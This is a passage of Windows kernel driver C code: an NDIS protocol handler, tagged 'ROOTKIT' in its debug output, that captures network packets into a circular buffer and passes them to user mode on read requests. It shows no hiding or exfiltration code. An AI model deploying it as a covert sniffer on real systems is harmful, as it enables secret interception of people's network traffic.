						pPacket,
						&BytesTransfered);

					if (Status != NDIS_STATUS_PENDING) 
					{
						DbgPrint("ROOTKIT: ORI: did not pend\n");
						/*  If it didn't pend, call the completion routine now */
						OnTransferDataDone(
							Open,
							pPacket,
							Status,
							BytesTransfered
							);
					}
					return NDIS_STATUS_SUCCESS;	
				}
				ExFreePool(RESERVED(pPacket)->pHeaderBufferP);
			}
			else
			{
				DbgPrint("ROOTKIT: ORI: pHeaderBufferP allocation failed!\n");
			}
			DbgPrint("ROOTKIT: ORI: NdisFreePacket()\n");
			NdisFreePacket(pPacket);	
		}
		DbgPrint("ROOTKIT: ORI: ExFreePool()\n");
		ExFreePool(aTemp);
	}
	return NDIS_STATUS_SUCCESS;
}



VOID 
OnReceiveDoneStub( IN NDIS_HANDLE ProtocolBindingContext ) {
	DbgPrint("ROOTKIT: OnReceiveDoneStub called\n");
    return;
}


VOID 
OnStatus( IN NDIS_HANDLE ProtocolBindingContext, 
		  IN NDIS_STATUS Status, 
		  IN PVOID StatusBuffer, 
		  IN UINT StatusBufferSize ) {
    DbgPrint("ROOTKIT: OnStatus called\n");
	return;
}


VOID 
OnStatusDone( IN NDIS_HANDLE ProtocolBindingContext ) {
	DbgPrint("ROOTKIT:OnStatusDone called\n");
    return;
}


NTSTATUS 
OnReadStub( IN PDEVICE_OBJECT theDevObj, IN PIRP theIrp ) 
{
	POPEN_INSTANCE      anOpenP;
    PIO_STACK_LOCATION  anIrpStackP;
    NDIS_STATUS         aStatus;
	PVOID				aDataBufferP = NULL;
	ULONG				aPosition = 0;
	KIRQL				aIrql;

    DbgPrint("ROOTKIT: OnReadStub called\n");

    anIrpStackP = IoGetCurrentIrpStackLocation(theIrp);
    anOpenP = anIrpStackP->FileObject->FsContext;
    
    /* is the buffer is atleast big enough to hold the ethernet header? */
    if (anIrpStackP->Parameters.Read.Length < ETHERNET_HEADER_LENGTH)
	{
		/* a little cramped! */
        theIrp->IoStatus.Status = STATUS_UNSUCCESSFUL;
		IoCompleteRequest(theIrp, IO_NO_INCREMENT);
        return STATUS_UNSUCCESSFUL;
    }

	KeAcquireSpinLock(&GlobalArraySpinLock, &aIrql);
	// -------------------------------------------------------------------	
	/* start at zero if needed */
	aPosition = (MAX_POSITIONS != (GPFront + 1)) ? (GPFront + 1) : 0; 

	/* circle to zero if needed, find first non-null ptr */
	while( (NULL == GlobalPtrArray[aPosition].mBuf) &&  aPosition != GPFront )
	{
		if(MAX_POSITIONS == ++aPosition) aPosition = 0; 
	}

	/* if circular buffer was empty, this will point to null */
	if(NULL != GlobalPtrArray[aPosition].mBuf)
	{
		PVOID aVoidP = NULL;
		ULONG aLength = 0;

		aVoidP = GlobalPtrArray[aPosition].mBuf;
		aLength = (GlobalPtrArray[aPosition].mLen < anIrpStackP->Parameters.Read.Length) ? 
			GlobalPtrArray[aPosition].mLen : anIrpStackP->Parameters.Read.Length;

		GlobalPtrArray[aPosition].mBuf = NULL;
		
		/* do not play w/ memory why we own the spinlock */
		KeReleaseSpinLock(&GlobalArraySpinLock, aIrql);
		// ---------------------------------------------------------------
		/* copy our buffer into theIrp's actual readbuffer.. 
		 * a little less performance oriented than using Mdl's to
		 * the memory directly... oh well. */
		NdisMoveMappedMemory(
			MmGetSystemAddressForMdl(theIrp->MdlAddress),
			aVoidP,
			aLength
			);
		theIrp->IoStatus.Information = aLength; /* so user knows how much they read */
		ExFreePool(aVoidP);
		IoCompleteRequest(theIrp, IO_NO_INCREMENT);
		return NDIS_STATUS_SUCCESS;
	}
	KeReleaseSpinLock(&GlobalArraySpinLock, aIrql);
	// -------------------------------------------------------------------

	/* No packets were ready... */
    theIrp->IoStatus.Status = STATUS_UNSUCCESSFUL;
	IoCompleteRequest(theIrp, IO_NO_INCREMENT);
        return STATUS_UNSUCCESSFUL;
}
